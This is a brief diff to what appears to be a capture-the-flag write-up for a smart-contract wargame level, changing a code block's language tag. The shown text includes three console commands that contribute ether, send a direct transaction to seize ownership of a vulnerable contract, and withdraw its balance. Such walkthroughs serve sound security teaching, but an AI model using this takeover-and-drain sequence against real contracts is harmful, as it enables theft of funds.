@@ -15,7 +15,7 @@ receive() external payable {
 ```
 
 Little needs to be said, we need to contribute once and then send a bogus transaction with < 0.0 value. Here are the commands:
-```solidity
+```javascript
 contract.contribute({to: instance, from: player, value: toWei("0.0005", "ether")})
 sendTransaction({from: player, to: contract, value: toWei("0.0005", "ether")})
 contract.withdraw()
